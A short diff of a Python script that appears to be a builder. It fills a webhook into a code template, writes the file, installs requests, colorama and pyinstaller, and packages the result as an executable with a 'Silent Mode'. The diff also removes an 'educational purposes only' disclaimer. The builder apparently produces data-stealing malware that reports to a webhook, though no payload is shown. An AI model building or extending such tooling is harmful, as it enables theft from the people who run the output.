@@ -1,7 +1,3 @@
-# Disclaimer: This is only for entertainment and educational purposes.  
-# I'm not responsible for what you do with it or any consequences.  
-# Made by Vexi :3
-
 import os
 import time
 import shutil
@@ -125,6 +121,12 @@ Silent Mode: {silent_mode}""")
                 modified_source = modified_source.replace("{placeholder_webhook}", webhook)
                 f.write(modified_source)
                 print(f"{GREEN}File contents have been written!{RESET}")
+
+            time.sleep(1)
+            print(f"{GREEN}Installing requirements..{RESET}")
+            os.system("pip install requests")
+            os.system("pip install colorama")
+            os.system("pip install pyinstaller")
 
             time.sleep(1)
             print(f"{GREEN}Installing python to exe requirements..{RESET}")
